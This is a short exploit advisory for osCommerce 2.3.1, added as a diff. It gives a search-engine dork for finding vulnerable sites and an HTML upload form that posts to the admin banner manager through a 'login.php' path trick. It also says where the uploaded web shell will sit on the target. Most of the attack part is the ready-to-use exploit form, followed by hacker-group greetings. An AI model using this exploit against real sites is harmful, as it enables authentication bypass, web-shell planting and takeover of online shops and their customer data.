@@ -1,0 +1,21 @@
+# Exploit Title: [OSC 2.3.1: Remote File Upload Vulnerability : Banner Manager]
+# Google Dork: [powered by oscommerce]  (we will automatically add these to the GHDB)
+# Date: [13-05-2011]
+# Author: [Number 7]
+# Software Link: [http://www.oscommerce.com/ext/oscommerce-2.3.1.zip]
+# Version: [2.3.1]
+# Tested on: [Linux-apache-win03-mac Os .... ]
+# CVE : [if exists]
+_______________________________________________________________________________________
+
+<form name="new_banner" action="http://site/path/admin/banner_manager.php/login.php?action=insert" method="post" enctype="multipart/form-data"><br>
+<input type="file" name="banners_image"><br>
+<input name="submit" value=" Save " type="submit"></form>
+
+you will find your shell in
+
+http://site/path/images/yourshell.php
+
+_______________________________________________________________________________________
+Greetz: Ares-xGeek-allen-s man-SWAT-SPAM-TN // Tn-Hackers
+Site:   Top-sec.com/vb // arhack.net/vb
